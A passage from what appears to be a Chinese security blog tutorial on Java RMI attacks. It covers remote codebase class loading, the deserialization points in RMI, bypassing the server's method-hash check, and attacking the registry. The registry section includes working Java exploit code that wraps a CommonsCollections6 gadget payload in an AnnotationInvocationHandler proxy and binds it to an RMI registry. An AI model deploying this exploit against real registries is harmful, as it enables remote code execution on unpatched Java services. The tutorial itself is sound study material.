class="line">    <span class="keyword">return</span> readObject(); <span class="comment">// 默认行为：从输入流读取下一个对象，作为类注解</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 始终读取由 MarshalOutputStream 写入的注解（annotation），</span></span><br><span class="line"><span class="comment"> * 该注解描述了类应当从哪里加载（即 codebase 的来源位置）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这一步通常出现在远程对象反序列化的过程中，</span></span><br><span class="line"><span class="comment"> * 用于获取服务端提供的类加载路径信息。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">annotation</span> <span class="operator">=</span> readLocation();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果 &quot;java.rmi.server.useCodebaseOnly&quot; 属性为 true，</span></span><br><span class="line"><span class="comment"> * 或者调用了 useCodebaseOnly() 方法，或者注解（annotation）不是字符串，</span></span><br><span class="line"><span class="comment"> * 则使用本地类加载器和 &quot;java.rmi.server.codebase&quot; 属性指定的 URL 加载类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 否则，将使用注解中的 codebase URL 创建的类加载器来加载类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">String</span> <span class="variable">codebase</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!useCodebaseOnly &amp;&amp; annotation <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    codebase = (String) annotation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 根据指定的 codebase、类名以及默认类加载器加载类</span></span><br><span class="line">    <span class="keyword">return</span> RMIClassLoader.loadClass(codebase, className, defaultLoader);</span><br><span class="line">&#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>然而从 <strong>JDK 6u45、7u21</strong> 开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是 <code>true</code>，也就是说我们不能指定目标服务器从任意地址加载恶意类。这导致 RMI 远程类加载这种攻击方式变得很鸡肋。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 缓存系统属性 “java.rmi.server.useCodebaseOnly” 的布尔语义。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义规则：</span></span><br><span class="line"><span class="comment"> *   - 默认值为 true（即**只**使用本地的 java.rmi.server.codebase，不信任远端注解）。</span></span><br><span class="line"><span class="comment"> *   - 只有当该属性**存在**且**值为 &quot;false&quot;（忽略大小写）**时，才设为 false。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 安全提示：</span></span><br><span class="line"><span class="comment"> *   - true（默认）更安全：禁止按远端注解任意下载/加载类。</span></span><br><span class="line"><span class="comment"> *   - false 较危险：允许基于远端注解的动态类加载（CTF 常用、生产谨慎）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">useCodebaseOnlyProperty</span> <span class="operator">=</span></span><br><span class="line">    <span class="comment">// 读取系统属性：若未设置则返回默认的 &quot;true&quot;</span></span><br><span class="line">    !java.security.AccessController.doPrivileged(</span><br><span class="line">        <span class="comment">// 使用特权动作读取属性（兼容老式 SecurityManager 环境）</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">sun</span>.security.action.GetPropertyAction(</span><br><span class="line">            <span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;true&quot;</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// 仅当属性值为 &quot;false&quot;（忽略大小写）时，结果才为 false；其余情况均为 true</span></span><br><span class="line">    .equalsIgnoreCase(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实例级别的开关，初始取自静态缓存。</span></span><br><span class="line"><span class="comment"> * 为 true 时：仅从 &quot;java.rmi.server.codebase&quot; 指定的 URL 加载本地缺失的类；</span></span><br><span class="line"><span class="comment"> * 为 false 时：还会考虑远端对象流里的 codebase 注解（可能导致远程类下载）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">useCodebaseOnly</span> <span class="operator">=</span> useCodebaseOnlyProperty;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>LoaderHandler#loadClass</code> 中会通过 <code>pathToURLs</code> 函数将我们远程指定的 <code>codebase</code> 转换成 <code>URL</code> 数组。</p>
<p>如果我们没有远程指定 <code>codebase</code> 或者 <code>useCodebaseOnly</code> 值为 <code>true</code> 导致 <code>codebase</code> 为 <code>null</code>，则会通过 <code>getDefaultCodebaseURLs</code> 初始化 <code>url</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从网络位置（一个或多个 URL）加载指定名称的类。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在尝试通过远程 codebase 加载之前，优先尝试使用给定的 &quot;默认类加载器&quot;（defaultLoader）进行类解析。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase      表示类下载路径的 URL 字符串（可以是多个 URL，用空格分隔）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name          要加载的类的全限定名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> defaultLoader 默认类加载器，优先使用此加载器加载类（如果提供）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>              加载成功的类对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException 如果 codebase URL 格式非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果类无法通过任一方式加载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String codebase, String name,</span><br><span class="line">                                 ClassLoader defaultLoader)</span><br><span class="line">    <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 codebase 字符串转换为 URL 数组</span></span><br><span class="line">    URL[] urls;</span><br><span class="line">    <span class="keyword">if</span> (codebase != <span class="literal">null</span>) &#123;</span><br><span class="line">        urls = pathToURLs(codebase); <span class="comment">// 将 codebase 转为 URL[]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        urls = getDefaultCodebaseURLs(); <span class="comment">// 获取默认的 codebase URL（通常是 java.rmi.server.codebase）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先尝试使用默认类加载器加载类</span></span><br><span class="line">    <span class="keyword">if</span> (defaultLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果默认类加载器加载失败，则使用远程 codebase URL 进行加载</span></span><br><span class="line">    <span class="keyword">return</span> loadClass(urls, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getDefaultCodebaseURLs</code> 实际上返回的是 <code>codebaseProperty</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回一个 URL 数组，内容是根据系统属性</span></span><br><span class="line"><span class="comment"> * &quot;java.rmi.server.codebase&quot; 的值构造出的路径。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这个方法会在第一次调用时，将 codebase 字符串解析为 URL 数组并缓存，</span></span><br><span class="line"><span class="comment"> * 后续调用直接返回缓存结果。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> URL[] 表示默认 codebase 的 URL 路径数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException 如果 codebase 中包含非法的 URL 格式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> URL[] getDefaultCodebaseURLs()</span><br><span class="line">    <span class="keyword">throws</span> MalformedURLException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果还没有解析过，就将 codebaseProperty（系统属性）转换为 URL 数组。</span></span><br><span class="line"><span class="comment">     * 如果解析失败，可能会抛出 MalformedURLException。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (codebaseURLs == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (codebaseProperty != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 将 codebase 字符串转为 URL[] 并缓存</span></span><br><span class="line">            codebaseURLs = pathToURLs(codebaseProperty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 没有设置 codebase 属性，则使用空数组</span></span><br><span class="line">            codebaseURLs = <span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回缓存的 URL 数组</span></span><br><span class="line">    <span class="keyword">return</span> codebaseURLs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>LoaderHandler</code> 的静态代码块中 <code>codebaseProperty</code> 被初始化，读取的是本地配置的 <code>java.rmi.server.codebase</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &quot;java.rmi.server.codebase&quot; 属性的值，会在类初始化时被缓存。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 它用于指定远程类加载时所依赖的 URL（如 .class 文件或 JAR 包的位置），</span></span><br><span class="line"><span class="comment"> * 供客户端通过网络动态加载服务端的类。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意：该属性的值可能包含格式错误（malformed）的 URL。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">codebaseProperty</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 在安全权限控制下获取系统属性 &quot;java.rmi.server.codebase&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">prop</span> <span class="operator">=</span> java.security.AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">GetPropertyAction</span>(<span class="string">&quot;java.rmi.server.codebase&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果属性存在且不为空白，则缓存该属性值</span></span><br><span class="line">    <span class="keyword">if</span> (prop != <span class="literal">null</span> &amp;&amp; prop.trim().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        codebaseProperty = prop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>RMI 的整个过程设计多处反序列化，因此易被反序列化攻击：</p>
<ul>
<li>攻击客户端<ul>
<li><code>RegistryImp_Stub#lookup</code>：反序列化注册中心返回的 Stub</li>
<li><code>UnicastRef#invoke</code>：反序列化远调方法的执行结果</li>
<li><code>StreamRemoteCall#executeCall</code>：反序列化远程调用返回的异常类</li>
<li><code>DGCImpl_Stub#dirty</code></li>
</ul>
</li>
<li>攻击服务端<ul>
<li><code>UnicastServerRef#dispatch</code>：反序列化客户端传递的方法参数</li>
<li><code>DGCImpl_Skel#dispatch</code></li>
</ul>
</li>
<li>攻击注册中心<ul>
<li><code>RegistryImp_Stub#bind</code>：注册中心反序列化服务端传递传来的远程对象</li>
</ul>
</li>
</ul>
<h4 id="攻击服务端（无限制）"><a href="#攻击服务端（无限制）" class="headerlink" title="攻击服务端（无限制）"></a>攻击服务端（无限制）</h4><p><code>UnicastServerRef#dispatch</code> 调用了<code>unmarshalValue</code>来反序列化客户端传来的远程方法参数，因此我们可以通过传递反序列化 payload 作为参数在服务端触发反序列化漏洞。</p>
<p>然而远程方法的参数是有参数类型的，所以我们进行远程方法调用的时候要求参数类型要与方法定义的参数类型相匹配，例如：</p>
<ul>
<li>如果远程方法的参数是 <code>Object</code> 类型的，那么我们之间传递反序列化 payload 是可以正常在远程触发反序列化漏洞的。</li>
<li>但是如果远程方法的参数与我们传递的反序列化 payload 的类型不匹配，那么我们在传递参数的时候在本地就会报类型错误。</li>
</ul>
<p>针对这种情况我们有如下尝试：</p>
<ul>
<li><p>如果我们在获取远程对象后通过反射调用远程方法并强制传入反序列化 payload ，此时会有 <code>java.lang.IllegalArgumentException: argument type mismatch</code> 报错，这说明反射调用和正常调用一样会有参数检查。</p>
</li>
<li><p>如果我们在另外定义一个与我们参数类型匹配的方法，则不匹配则会有 <code>java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object</code> 报错。这是因为客户端方法的哈希和服务端方法的哈希不同，<code>hashToMethod_Map</code> 找不到对应的方法。</p>
</li>
</ul>
<p>从上述尝试中我们发现，<strong>其实参数类型的校验始终发生在本地，远程反序列化参数之前都不知道我们传递的参数是什么，更谈不上参数类型的校验。</strong></p>
<p>前面第二种尝试可以绕本地参数类型的校验，我们只需要在这种方法的基础上想办法修改远程方法调用时传递的方法的哈希就可以在服务端反序列化参数。</p>
<p>最直接的修改哈希的方法就是通过调试在 <code>RemoteObjectInvocationHandler</code> 调用 <code>invokeRemoteMethod</code> 的时候修改 <code>getMethodHash(method)</code> 获取到的哈希。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理远程方法调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程对象的 invoke 方法，传递代理对象、方法、参数和方法的哈希值</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另一种方法就是通过 Java Agent 技术进行字节码插桩，以此来修改方法哈希。</p>
<h4 id="攻击注册中心（8u121、7u131、6u141-前）"><a href="#攻击注册中心（8u121、7u131、6u141-前）" class="headerlink" title="攻击注册中心（8u121、7u131、6u141 前）"></a>攻击注册中心（8u121、7u131、6u141 前）</h4><p>注册中心和服务端是可以分开的，服务端可以使用 <code>Naming</code> 提供的接口来操作注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>前面分析过，这种写法本质上等价于下面这个写法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>这里获取到的实际上就是 <code>Registry</code> 的动态代理 <code>ResgitryImpl_Stub</code>，其中的 <code>bind</code> 方法依然存在序列化和反序列化。服务端将待绑定的对象序列化，注册中心收到后反序列化。</p>
<p>低版本 RMI 注册中心没有身份验证的功能，客户端都可以进行 <code>bind</code>、<code>unbind</code>、<code>rebind</code> 这些操作。</p>
<p>这里 <code>bind</code> 的参数因为是远程对象，所以要求是 <code>Remote</code> 类型。</p>
<p>但是我们不能直接让反序列化 payload 实现 <code>Remote</code> 接口。这是因为反序列化利用的类都是注册中心中存在的类。如果强行定义一个实现 <code>Remote</code> 的接口，则在注册中心反序列化的时候会出现找不到类的情况。</p>
<p>我们知道 <code>HashMap</code> 类型在反序列化的时候键值对都会分别被反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取阈值（被忽略）、加载因子以及其他隐藏的内容</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 重新初始化HashMap</span></span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="comment">// 检查加载因子是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取并忽略桶的数量</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    <span class="comment">// 读取映射的数量（即HashMap的大小）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="comment">// 检查映射数量是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果映射数量大于零，则进行初始化</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 读取键和值，并将映射放入HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject(); <span class="comment">// 读取键对象</span></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject(); <span class="comment">// 读取值对象</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>); <span class="comment">// &lt;-- 调用hash函数并插入键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此可以使用 <code>AnnotationInvocationHandler</code> 来动态代理 <code>Remote</code> 接口，并且设置 <code>memberValues</code> 为 <code>HashMap</code>，然后 <code>HashMap</code> 中再存放反序列化的 payload。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() || <span class="comment">//  `type` 还要继承自 `Annotation`</span></span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">//  `memberTypes` 中的 `key` 是构造时传入的 `type` 对应的类中的所有方法名字符串</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues; <span class="comment">// `name` 是构造时传入的 `memberValues` 中的某个 `key`。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时生成的动态代理对象继承于 <code>Remote</code>，符合参数条件，并且动态代理在反序列化的时候会反序列化 <code>AnnotationInvocationHandler</code> 进而反序列化 <code>memberValues</code> 成员（即 <code>HashMap</code>），并最终反序列化 <code>HashMap</code> 中的键值对触发反序列化 payload。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(<span class="string">&quot;sky123&quot;</span>, CommonsCollections6.getPayload());</span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, hashMap);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br></pre></td></tr></table></figure></div>

<h4 id="攻击客户端（无限制）"><a href="#攻击客户端（无限制）" class="headerlink" title="攻击客户端（无限制）"></a>攻击客户端（无限制）</h4><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p>
<p>这部分攻击实战意义较少，并且与上述讨论的攻击 Server 端和 Registry 端的攻击都是镜像行为，所以这里简单描述一下流程就不再演示了。</p>
<ul>
<li><p>恶意 Server Stub：同攻击 Registry 端，Client 端在 Registry 端 lookup 后会拿到一个 Server 端注册在 Registry 端的代理对象并反序列化触发漏洞。</p>
</li>
<li><p>恶意 Server 端返回值：同攻击 Server 端的恶意服务参数，Server 端返回给 Client 端恶意的返回值，Client 端反序列化触发漏洞，不再赘述。</p>
</li>
<li><p>动态类加载：同攻击 Server 端的动态类加载，Server 端返回给 Client 端不存在的类，要求 Client 端去 codebase 地址远程加载恶意类触发漏洞，不再赘述。</p>
</li>
</ul>
<h4 id="攻击DGC"><a href="#攻击DGC" class="headerlink" title="攻击DGC"></a>攻击DGC</h4><h2 id="JEP290-检测与绕过"><a href="#JEP290-检测与绕过" class="headerlink" title="JEP290 检测与绕过"></a>JEP290 检测与绕过</h2><h3 id="RMI-中的-JEP290-过滤"><a href="#RMI-中的-JEP290-过滤" class="headerlink" title="RMI 中的 JEP290 过滤"></a>RMI 中的 JEP290 过滤</h3><h4 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h4><p>RMI 在调用远程方法时，服务端 <code>sun.rmi.server.UnicastServerRef#dispatch</code> 会反序列化客户端发送的序列化参数对象。</p>
